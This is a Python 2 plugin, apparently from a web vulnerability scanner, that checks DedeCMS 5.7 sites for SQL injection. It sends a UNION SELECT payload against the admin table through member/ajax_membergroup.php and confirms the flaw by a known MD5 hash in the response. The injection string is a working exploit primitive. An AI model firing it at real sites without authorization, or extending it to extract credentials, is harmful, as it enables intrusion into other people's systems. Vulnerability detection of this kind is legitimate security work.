#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "member/ajax_membergroup.php?action=post&membergroup=@`’`%20Union%20select%20md5(333333)%20from%20`%23@__admin`%20where%201%20or%20id=@`’`"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if content.find('1a100d2c0dab19c4430e7d73762b3423')>=0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,ob['scheme']+"://"+ob['domain']+ob['base_path'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:dedecms5_7sqlinjectionscript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:dedecms5_7sqlinjectionscript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def